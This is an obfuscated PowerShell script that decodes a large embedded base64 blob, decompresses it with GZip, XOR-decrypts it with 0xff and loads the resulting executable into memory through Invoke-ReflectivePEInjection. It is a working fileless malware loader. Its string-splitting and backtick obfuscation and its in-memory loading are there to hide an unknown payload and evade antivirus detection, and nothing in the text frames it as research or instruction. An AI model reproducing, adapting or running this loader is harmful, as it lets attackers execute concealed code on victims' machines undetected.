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')
}


${DA`Ta} =   ( &("{1}{0}" -f'lE','VariAb')  ("{1}{0}"-f 'V','ckTm'))."vAL`UE"::("{2}{0}{1}{4}{3}"-f'omBase','64S','Fr','g','trin').Invoke(${baS`e64da`Ta})

${MS} = &("{1}{2}{0}{3}"-f'j','New-O','b','ect') ("{2}{0}{1}{3}" -f'em.IO.M','emory','Syst','Stream')
${OU`T`pUT} = &("{2}{0}{1}" -f 'b','ject','New-O') ("{3}{4}{0}{6}{5}{2}{1}" -f'IO.Mem','m','ea','System','.','ryStr','o')

${m`s}.("{0}{1}" -f 'W','rite').Invoke(${DA`TA}, 0, ${da`TA}."Le`N`gTh")
${mS}.("{0}{1}"-f 'See','k').Invoke(0,0) | &("{1}{0}{2}"-f 'ut-Nul','O','l')


${D`sT`REaM} = &("{2}{1}{0}{3}"-f'bje','-O','New','ct') ("{3}{2}{4}{1}{5}{0}" -f'pStream','ssion.GZ','tem.','Sys','IO.Compre','i')(${mS},  (&("{2}{0}{1}"-f'ARIaB','lE','V') ('BD'+'1G')  )."val`Ue"::"d`eCompr`ESs")


${In`Byte} = ${DST`R`eAm}.("{0}{1}" -f 'Rea','dByte').Invoke()
while(${in`B`YtE} -ne -1){
    ${OUT`p`UT}.("{1}{0}"-f 'eByte','writ').Invoke(${i`NBYtE})
    ${INBy`TE} = ${dS`TREaM}.("{2}{1}{0}"-f 'yte','dB','Rea').Invoke()
}

&("{1}{3}{0}{2}" -f'ite-V','w','erbose','r') ("{0}{3}{2}{1}{4}" -f'Payl','decod',' ','oad','ed')
${exE`CoNteNTasB`yt`ES} = ${oU`T`pUt}.("{1}{0}"-f'Array','To').Invoke()

${P`Ay`L`OAD`LENgth} = ${Ex`eCo`NTe`N`TaSBYTeS}."leN`gtH"
&("{3}{2}{1}{0}{4}"-f 'rb','e-Ve','rit','w','ose') ('payl'+'oa'+'d'+'Length '+'= '+"$payloadLength")


[IntPtr]${peB`ytES`InMe`M`Ory} =  ${6`9Pb}::("{2}{0}{3}{1}"-f'llocHGlo','l','A','ba').Invoke(${paylo`Ad`LE`N`GTH})

${HS`Tr} = ${pEbYTE`si`Nme`M`OrY}.("{2}{1}{0}" -f'ing','Str','To').Invoke()
&("{0}{2}{1}"-f 'wr','ose','ite-Verb') (' '+'PE'+'B'+'y'+'tesIn'+'Memory '+'= '+"$hStr")


${c`URr`ent} = &("{2}{1}{0}" -f'te','et-da','G') -uformat ("{0}{4}{1}{5}{2}{3}"-f'%d','m-%y-%H','%','M-%S','-%','-')
&("{2}{1}{3}{0}"-f 'ose','rite-V','w','erb') ('Dec'+'ry'+'pt '+'PEBy'+'tes'+'InMe'+'mory '+'start'+' '+"current=$current")
For (${i}=2; ${I} -lt ${PAYLO`A`DlE`NgTH}; ${I}++) {
	${OneB`ytE} = ${ExeC`OntEntAs`B`YteS}[${i}]
	${oNEB`Yte} = ${O`Ne`BytE}  -bxor 0xff
	${exeC`O`NtEN`Tasb`Yt`es}[${I}] = ${o`N`eBYTe} 
}


&("{2}{1}{3}{0}" -f 'e','te-Verbo','wri','s') ("{2}{1}{3}{0}"-f 'ib','o','Call Mem','ryLoadL')


&("{2}{1}{0}{5}{3}{4}{6}" -f 'k','o','Inv','eflectivePEI','nj','e-R','ection') -PEBytes ${e`Xe`CO`NTeNt`AS`BYTEs} 


